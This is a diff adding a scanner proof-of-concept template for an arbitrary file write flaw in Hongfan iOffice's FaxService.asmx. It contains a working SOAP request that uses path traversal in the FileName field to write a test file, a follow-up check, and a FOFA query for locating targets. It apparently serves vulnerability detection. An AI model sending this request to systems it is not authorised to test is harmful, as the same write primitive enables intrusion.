@@ -1,0 +1,43 @@
+id: poc-yaml-ioffice-faxservice-upload
+info:
+  name: 红帆OA FaxService.asmx 任意文件写入漏洞
+  severity: critical
+  tags:
+  - 任意写入
+  finger: iOffice
+  fofa: app="红帆-ioffice"
+variables:
+  filename: to_lower(random_str(10))
+requests:
+- method: POST
+  path: /iOffice/prg/set/wss/FaxService.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: '"http://tempuri.org/SaveConvertTif"'
+  data: '<?xml version="1.0" encoding="utf-8"?>
+
+    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+
+    <soap:Body>
+
+    <SaveConvertTif xmlns="http://tempuri.org/">
+
+    <FaxID>1</FaxID>
+
+    <Pages>2</Pages>
+
+    <FileName>../../../../{{.filename}}.txt</FileName>
+
+    <FileContent>dGVzdDEyMw==</FileContent>
+
+    </SaveConvertTif>
+
+    </soap:Body>
+
+    </soap:Envelope>'
+  expression: "status_code == 200 && \ncontains(body,\"SaveConvertTifResponse\")\n"
+- method: GET
+  path: /iOffice/{{.filename}}.txt
+  expression: "status_code == 200 && \nbody == \"test123\"\n"
+transport: http
